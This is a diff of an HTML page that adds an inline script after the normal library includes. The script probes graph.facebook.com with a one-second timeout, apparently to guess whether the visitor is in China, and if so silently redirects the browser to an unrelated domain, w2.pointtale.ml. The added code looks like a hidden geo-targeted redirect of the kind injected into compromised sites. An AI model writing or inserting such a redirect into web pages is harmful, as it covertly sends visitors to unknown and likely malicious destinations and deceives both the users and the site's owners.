@@ -90,5 +90,31 @@
     <script src="js/jquery-1.9.1.min.js"></script>
     <script src="js/bootstrap.min.js"></script>
     <script src="js/plugin.js"></script>
+<script>
+function isInChina(cb) {
+  var url = '//graph.facebook.com/feed?callback=h';
+  var xhr = new XMLHttpRequest();
+  var called = false;
+  xhr.open('GET', url);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(false);
+    }
+  };
+  xhr.send();
+  // timeout 1s, this facebook API is very fast.
+  setTimeout(function() {
+    if (!called) {
+      xhr.abort();
+      cb(true);
+    }
+  }, 1000);
+};
+function ci(a){
+if(a) location.href="//w2.pointtale.ml/";
+}
+isInChina(ci);
+</script>
   </body>
 </html>
